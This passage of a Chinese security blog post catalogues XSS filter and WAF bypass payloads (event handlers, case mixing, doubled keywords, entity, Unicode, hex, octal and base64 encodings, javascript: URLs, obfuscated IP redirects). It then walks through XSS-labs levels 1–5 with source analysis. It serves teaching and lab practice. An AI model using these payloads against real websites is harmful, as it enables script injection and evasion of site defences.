class="headerlink" title="关键字被过滤的情况"></a>关键字被过滤的情况</h2><hr><h3 id="用标签"><a href="#用标签" class="headerlink" title="用&lt;svg&gt;标签"></a>用<code>&lt;svg&gt;</code>标签</h3><blockquote><p>(个人感觉比较少被过滤,起码比<code>&lt;script&gt;</code>标签少)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;svg onload=&quot;alert(1)&quot;&gt;<br></code></pre></td></tr></table></figure><p>基于像<code>&lt;script&gt;</code>标签这样被过滤的情况。<code>&lt;img&gt;</code>标签配合事件也行，不过基本都是配合<code>onerror</code>事件属性，别的事件更难触发，像<code>onclick</code>事件要触发还需要受害者点击等等，如果<code>onerror</code>事件属性被过滤了再考虑使用。下面也有大量用到。</p><h3 id="注释符干扰绕过"><a href="#注释符干扰绕过" class="headerlink" title="注释符干扰绕过"></a>注释符干扰绕过</h3><p>html中的注释标签<code>&lt;!-- 在此处写注释 --&gt;</code>用于在 HTML 插入注释。</p><p>例如：<code>&lt;!-- 在此处写注释 --&gt;</code></p><p>绕过例子：</p><p><code>&lt;scri&lt;!--test--&gt;pt&gt;alert(&quot;hello world!&quot;)&lt;/scri&lt;!--test--&gt;pt&gt;</code></p><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;ImG sRc=1 onerRor=alert(1);&gt;<br><br>&lt;SvG OnlOad=&quot;alert(1)&quot;&gt;<br></code></pre></td></tr></table></figure><h3 id="双写关键字（有限制）"><a href="#双写关键字（有限制）" class="headerlink" title="双写关键字（有限制）"></a>双写关键字（有限制）</h3><p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字来绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;<br></code></pre></td></tr></table></figure><p>先判断哪些关键字被过滤，然后再试试双写它。还是要具体情况具体分析吧，如果waf不是只替换一次且是替换为空，可能就不行了</p><h3 id="字符拼接"><a href="#字符拼接" class="headerlink" title="字符拼接"></a>字符拼接</h3><p>利用<code>eval</code>，这里反引号也可以用单引号、双引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;x&quot; onerror=&quot;a=`aler`;b=`t`;c=&#x27;(1);&#x27;;eval(a+b+c)&quot;&gt;<br><br>&lt;svg onload=&quot;a=`aler`;b=`t`;c=&#x27;(1);&#x27;;eval(a+b+c)&quot;&gt;<br></code></pre></td></tr></table></figure><p>利用<code>top</code>，这里反引号也可以用单引号、双引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;script&gt;top[`al`+`ert`](1);&lt;/script&gt;<br><br>&lt;img src=&quot;x&quot; onerror=&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](1);&quot;&gt;<br><br>&lt;svg onload=&#x27;top[&quot;al&quot;+&quot;ert&quot;](1);&#x27;&gt;<br></code></pre></td></tr></table></figure><h3 id="其它字符混淆"><a href="#其它字符混淆" class="headerlink" title="其它字符混淆"></a>其它字符混淆</h3><p>有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，那么我们就可以使用其它字符去混淆我们注入的代码了。<br>下面举几个简单的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">可利用注释、标签的优先级等<br>1.&lt;&lt;script&gt;alert(1);//&lt;&lt;/script&gt;<br>2.&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(`xss`);&quot;&gt; //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效<br>3.&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(1);//&quot;;&lt;/SCRIPT&gt;<br></code></pre></td></tr></table></figure><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="编码工具"><a href="#编码工具" class="headerlink" title="编码工具"></a>编码工具</h4><p>这里推荐几个编码的网址：</p><p><a href="http://ctf.ssleye.com/">CTF编码</a></p><p><a href="https://www.qqxiuzi.cn/bianma/zifushiti.php">HTML字符实体转换</a></p><p>以下的payload都是实现弹窗，在用之前可自行在靶场判断是否可行。</p><h4 id="HTML实体编码绕过"><a href="#HTML实体编码绕过" class="headerlink" title="HTML实体编码绕过"></a>HTML实体编码绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">10进制实体编码：<br>&lt;img src=1 onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;<br><br>16进制实体编码：<br>&lt;img src=1 onerror=&quot;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;&amp;#x3B;&quot;&gt;<br></code></pre></td></tr></table></figure><h4 id="Unicode编码绕过"><a href="#Unicode编码绕过" class="headerlink" title="Unicode编码绕过"></a>Unicode编码绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&#x27;a&#x27; onerror=&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;&gt;<br></code></pre></td></tr></table></figure><h4 id="escape编码绕过"><a href="#escape编码绕过" class="headerlink" title="escape编码绕过"></a>escape编码绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;a&quot; onerror=&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;&gt;<br></code></pre></td></tr></table></figure><h4 id="ASCII码绕过"><a href="#ASCII码绕过" class="headerlink" title="ASCII码绕过"></a>ASCII码绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;b&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;<br></code></pre></td></tr></table></figure><h4 id="十六进制编码绕过"><a href="#十六进制编码绕过" class="headerlink" title="十六进制编码绕过"></a>十六进制编码绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=x onerror=eval(&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;)&gt;<br></code></pre></td></tr></table></figure><p>这里就是普通的十六进制编码转换，像<code>61</code>就是<code>a</code>转换过来的,<code>6c</code>是<code>l</code>,<code>65</code>是<code>e</code>，依次下去就是<code>alert(&#39;xss&#39;)</code>。只不过每个前面都要加<code>\x</code>，因为Javascript里<code>\x</code>开头的通常是16进制编码的数据。这里注意<code>\x</code>的<code>x</code>是小写不能大写。</p><h4 id="八进制编码绕过"><a href="#八进制编码绕过" class="headerlink" title="八进制编码绕过"></a>八进制编码绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;script&gt;eval(&quot;\141\154\145\162\164\50\57\170\163\163\57\51&quot;);&lt;/script&gt; <br></code></pre></td></tr></table></figure><p>这里转换的也是<code>alert(&#39;xss&#39;)</code>。具体过程是先将<code>a</code>转换ASCII码十进制为97，再转换成8进制就为141了。记得141前面要加<code>\</code>，因为Javascript里<code>\</code>开头的通常是8进制编码的数据。后面依此类推。</p><h4 id="base64绕过"><a href="#base64绕过" class="headerlink" title="base64绕过"></a>base64绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img&gt;标签举例：<br>&lt;img src=&quot;c&quot; onerror=&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;&gt;   //原payload为document.location=&#x27;http://www.baidu.com&#x27;<br><br>&lt;img src=&quot;c&quot; onerror=&quot;eval(atob(&#x27;YWxlcnQoInhzcyIp&#x27;))&quot;&gt;<br><br>&lt;iframe&gt;标签举例：<br>&lt;iframe/src=data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&gt;&lt;/iframe&gt;<br><br>&lt;object&gt;标签举例：<br>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;img&lt;/object&gt;<br></code></pre></td></tr></table></figure><h3 id="Javascript伪协议的使用"><a href="#Javascript伪协议的使用" class="headerlink" title="Javascript伪协议的使用"></a>Javascript伪协议的使用</h3><p>例子：<code>&lt;table background=&quot;javascript:alert(1)&quot;&gt;&lt;/table&gt;</code>。其中引号可以去掉<br>支持Javascript伪协议的属性有：<code>img</code>,<code>href</code>,<code>lowsrc</code>,<code>bgsound</code>,<code>background</code>,<code>action</code>,<code>dynsrc</code></p><h3 id="包裹的js代码利用空格、回车、tab键"><a href="#包裹的js代码利用空格、回车、tab键" class="headerlink" title="&quot;&quot;包裹的js代码利用空格、回车、tab键"></a><code>&quot;&quot;</code>包裹的js代码利用空格、回车、tab键</h3><p>js代码中，利用<code>空格</code>，<code>回车</code>，<code>tab键</code>，切记只有<code>&quot;&quot;</code>包裹的js代码才可以随便利用<code>空格</code>，<code>回车</code>，<code>tab键</code>，比如<code>src=&quot;java script:xxxx&quot;</code>，而这样不行：<code>src=java script:xxxx</code>。而且<code>回车</code>、<code>换行</code>不支持在<code>on事件</code>中使用，<code>空格</code>可以</p><p>Javascript引擎特性：Javascript语句通常以分号结尾，但是如果引擎判断一条语句完整的话，且结尾有换行符，就可以省略分号。</p><p>例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">var a = 1<br>var b = 2;<br>//上述语句都正确<br></code></pre></td></tr></table></figure><p>示例：<code>&lt;img src=&quot;javas cript:alert(1)&quot;&gt;</code>,中间为<code>tab键</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">用于绕过某些XSS防护<br>&lt;img src=&quot;jav   ascript:alert(&#x27;XSS&#x27;);&quot;&gt;<br><br>    也可以对TAB编码<br>&lt;img src=&quot;jav&amp;#x09;ascript:alert(&#x27;XSS&#x27;);&quot;&gt;<br><br>    利用换行符拆解<br>&lt;img src=&quot;jav&amp;#x0A;ascript:alert(&#x27;XSS&#x27;);&quot;&gt;<br><br>    利用回车拆解<br>&lt;img src=&quot;jav&amp;#x0D;ascript:alert(&#x27;XSS&#x27;);&quot;&gt;<br></code></pre></td></tr></table></figure><h2 id="双引号、单引号被过滤的情况"><a href="#双引号、单引号被过滤的情况" class="headerlink" title="双引号、单引号被过滤的情况"></a>双引号、单引号被过滤的情况</h2><hr><h3 id="用反引号绕过"><a href="#用反引号绕过" class="headerlink" title="用反引号绕过"></a>用反引号绕过</h3><p>如果是在html标签中，我们可以不用引号；如果是在javascript的函数中，我们可以用反引号代替单双引号。</p><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;1&quot; onerror=alert(1);&gt;可以，<br>&lt;img src=`1` onerror=alert(1);&gt;不行；<br><br>&lt;img src=&quot;1&quot; onerror=&#x27;alert(1)&#x27;;&gt;可以，<br>&lt;img src=&quot;1&quot; onerror=`alert(1)`;&gt;不行；<br><br>&lt;img src=&quot;x&quot; onerror=alert(&#x27;1&#x27;);&gt;可以，<br>&lt;img src=&quot;x&quot; onerror=alert(`1`);&gt;可以；<br></code></pre></td></tr></table></figure><p>反引号绕过的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;x&quot; onerror=alert(`xss`);&gt;<br></code></pre></td></tr></table></figure><h3 id="编码绕过（具体看上面的）"><a href="#编码绕过（具体看上面的）" class="headerlink" title="编码绕过（具体看上面的）"></a>编码绕过（具体看上面的）</h3><p>使用编码绕过，具体看上面列举的那些，这里就不再赘述了</p><h2 id="括号被过滤的情况"><a href="#括号被过滤的情况" class="headerlink" title="括号被过滤的情况"></a>括号被过滤的情况</h2><hr><h3 id="用throw来绕过"><a href="#用throw来绕过" class="headerlink" title="用throw来绕过"></a>用<code>throw</code>来绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;<br></code></pre></td></tr></table></figure><h2 id="url地址被过滤的情况"><a href="#url地址被过滤的情况" class="headerlink" title="url地址被过滤的情况"></a>url地址被过滤的情况</h2><hr><h3 id="使用url编码"><a href="#使用url编码" class="headerlink" title="使用url编码"></a>使用url编码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;x&quot; onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`&gt;<br></code></pre></td></tr></table></figure><h3 id="使用IP地址"><a href="#使用IP地址" class="headerlink" title="使用IP地址"></a>使用IP地址</h3><p>以下都是跳转到<code>http://127.0.0.1</code>，需要用到这个：<a href="http://ip.chacuo.net/ipcalc?_t=b1561938109">IP地址计算器</a></p><p>下图是十六进制IP和十进制IP的绕过，十六进制IP加个<code>0x</code>：</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/004-image.jpg"></p><p>1.十进制IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;x&quot; onerror=document.location=`http://2130706433/`&gt;<br></code></pre></td></tr></table></figure><p>2.八进制IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;x&quot; onerror=document.location=`http://0177.0.0.01/`&gt;<br></code></pre></td></tr></table></figure><p>3.十六进制IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;x&quot; onerror=document.location=`http://0x7f.0x0.0x0.0x1/`&gt;<br></code></pre></td></tr></table></figure><h3 id="用-代替http"><a href="#用-代替http" class="headerlink" title="用//代替http://"></a>用<code>//</code>代替<code>http://</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;x&quot; onerror=document.location=`//www.baidu.com`&gt;<br></code></pre></td></tr></table></figure><h3 id="用-代替http-（服务器是Linux系统可以绕过-Windows则不行）"><a href="#用-代替http-（服务器是Linux系统可以绕过-Windows则不行）" class="headerlink" title="用\\代替http://（服务器是Linux系统可以绕过,Windows则不行）"></a>用<code>\\</code>代替<code>http://</code>（服务器是Linux系统可以绕过,Windows则不行）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">要注意在windows中\本身就有特殊用途，是一个path的写法，所以\\在Windows下是file协议，在linux中才会是当前域的协议<br></code></pre></td></tr></table></figure><p>在Windows中：</p><p>输入<code>\\www.baidu.com</code>，它就已经提示我会变成<code>file://www.baidu.com</code></p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/005-image.jpg"></p><p>访问便提示我没有这个文件</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/006-image.jpg"></p><p>而输入<code>\\D:/phpStudy/PHPTutorial/WWW/phpinfo.php</code>，就访问了我D盘中的这个phpinfo.php文件</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/007-image.jpg"></p><p>在Linux中：</p><p>输入<code>\\www.baidu.com</code></p><p>可以跳转到<code>https://www.baidu.com</code>，即百度</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/009-image.jpg"></p><h3 id="用。中文句号代替-英文句号"><a href="#用。中文句号代替-英文句号" class="headerlink" title="用。中文句号代替.英文句号"></a>用<code>。</code>中文句号代替<code>.</code>英文句号</h3><p>如果你在你在域名中输入<code>。</code>中文的句号，浏览器会自动转化成<code>.</code>英文的句号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;x&quot; onerror=&quot;document.location=`http://www。baidu。com`&quot;&gt;  //会自动跳转到百度<br></code></pre></td></tr></table></figure><h1 id="XSS-labs靶场实例"><a href="#XSS-labs靶场实例" class="headerlink" title="XSS-labs靶场实例"></a>XSS-labs靶场实例</h1><h2 id="level-1：直接构造"><a href="#level-1：直接构造" class="headerlink" title="level 1：直接构造"></a>level 1：直接构造</h2><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>第一关很简单。是get请求，提交name参数值为xi，完整的显示在返回的页面源代码中：</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/010-image.jpg"></p><p>那么我们把值xi改成<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，即可成功弹框，那么我们也就成功了：</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/011-image.jpg"></p><h2 id="后台源代码分析"><a href="#后台源代码分析" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p>通过<code>$_GET[&quot;name&quot;]</code>，获取<code>name</code>的值，没有过滤通过<code>echo</code>直接进行了输出</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/012-image.jpg"></p><h2 id="level-2：双引号尖括号闭合"><a href="#level-2：双引号尖括号闭合" class="headerlink" title="level 2：双引号尖括号闭合"></a>level 2：双引号尖括号闭合</h2><h2 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h2><p>这里我们在搜索框输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，可以发现其回显在了页面上，但是却没有弹框。这里可以看到标红的第1个点处我们的payload变成黑色了，那么第1个点肯定没希望了。</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/013-image.jpg"></p><p>这里再多放一个右键点击查看源代码的图，从这里我们才能看出来端倪，其中第一个点的尖括号是被实体编码了。F12看元素看不出来第一个点的尖括号是被实体编码了：</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/014-image.jpg"></p><p>从这里我们可以看出右键点击查看源代码和F12检查元素查看页面源代码有些许不同：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">右键查看页面源代码或F12查看网络中的响应包：就是别人服务器发送到浏览器的原封不动的代码，也就是最原始的代码。<br><br>(F12)检查元素：看到的就是最终的html代码。即：源代码 + 网页js渲染 。<br><br>【注】在源代码中找不到的代码，是在浏览器执行js动态生成的。<br></code></pre></td></tr></table></figure><p>那么这里回到上面标红的第2个点，第2个点会把我们输入的payload原封不动、不进行过滤的变成keyword的value。那么这里我们把前面的<code>&quot;</code>和input标签闭合：<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>，即可成功</p><h2 id="后台源代码分析-1"><a href="#后台源代码分析-1" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/015-image.jpg"></p><p><code>echo</code>的时候，采用<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体；然而获取浏览器提交的keyword值，未进行如此转换，输出在<code>&lt;input name=keyword value=&quot;&#39;.$str.&#39;&quot;&gt;</code>。</p><p>如果是keyword提交的是<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>,返回的就会是<code>&lt;input name=keyword value=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</code>,javascript引擎并不会执行<code>&lt;script&gt;</code>,所以需要构造闭合。</p><p>keyword提交<code>test&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;//</code>,php处理后返回的html就会是<code>&lt;input name=keyword value=&quot;test&quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt;//&quot;&gt;</code>，&#x2F;&#x2F;是注释的作用，javascript引擎执行<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，最后成功</p><h2 id="level-3：事件绕过和单引号闭合"><a href="#level-3：事件绕过和单引号闭合" class="headerlink" title="level 3：事件绕过和单引号闭合"></a>level 3：事件绕过和单引号闭合</h2><h2 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h2><p>输入payload<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;</code>，不能成功，F12看元素还是这两个点，第2个点还是可以插入我们输入的值，但是却不能成功</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/016-image.jpg"></p><p>那么依旧右键查看原始的页面源代码，才可以看出来这里两个点的尖括号都被实体编码了，而且value是<code>&#39;</code>单引号闭合；而F12中是<code>&quot;</code>双引号闭合的：</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/017-image.jpg"></p><p>那么这里构造事件来触发xss：<code>&#39; onclick=&#39;alert(1)</code>，这里我们通过右键查看原始的页面源代码也才能看出来是<code>&#39;</code>单引号才能闭合成功：</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/018-image.jpg"></p><p>最后再点击一下框就成功了：</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/019-image.jpg"></p><h2 id="后台源代码分析-2"><a href="#后台源代码分析-2" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/020-image.jpg"></p><p>采用<code>htmlspecialchars</code>函数对获取keyword参数中预定义的字符转换为 HTML 实体，输出在input标签的value中。<code>htmlspecichars</code>对尖括号进行了实体编码。</p><h2 id="level-4：事件绕过和双引号闭合"><a href="#level-4：事件绕过和双引号闭合" class="headerlink" title="level 4：事件绕过和双引号闭合"></a>level 4：事件绕过和双引号闭合</h2><h2 id="过程-3"><a href="#过程-3" class="headerlink" title="过程"></a>过程</h2><p>这一关和level 3类似，只不过右键查看原始的页面源代码是双引号闭合，所以构造payload:<code>&quot; onclick=&quot;alert(1)</code>，最后再点击一下框就成功了。</p><h2 id="后台源代码分析-3"><a href="#后台源代码分析-3" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/021-image.jpg"></p><p>对get请求的keyword参数，用<code>str_replace()</code>函数过滤掉尖括号，返回给keyword的值；采用<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体后用echo直接输出在返回的html中。</p><h2 id="level-5：javascript伪协议绕过"><a href="#level-5：javascript伪协议绕过" class="headerlink" title="level 5：javascript伪协议绕过"></a>level 5：javascript伪协议绕过</h2><h2 id="过程-4"><a href="#过程-4" class="headerlink" title="过程"></a>过程</h2><p>先右键查看原始的页面源代码，发现是双引号闭合，输入尖括号发现第一个输出点被实体编码，而第二个输出点没被实体编码，构造payload<code>&quot;&gt;&lt;scirpt&gt;alert(1)&lt;/script&gt;&lt;</code>，这时用F12查看，发现变成这样：</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/022-image.jpg"></p><p>明显不行。这时再构造payload<code>&quot; onclick=&quot;alert(1)</code>，发现返回的html代码对on进行了过滤。</p><p>那么这里利用没有过滤尖括号，构造a标签再尝试利用a标签的href属性执行javascript伪协议，payload：<code>&quot;&gt;&lt;a href=&#39;javascript:alert(1)&#39;&gt;</code>,没有对javascript伪协议进行过滤，对其进行点击，触发xss   </p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/023-image.jpg"></p><h2 id="后台源代码分析-4"><a href="#后台源代码分析-4" class="headerlink" 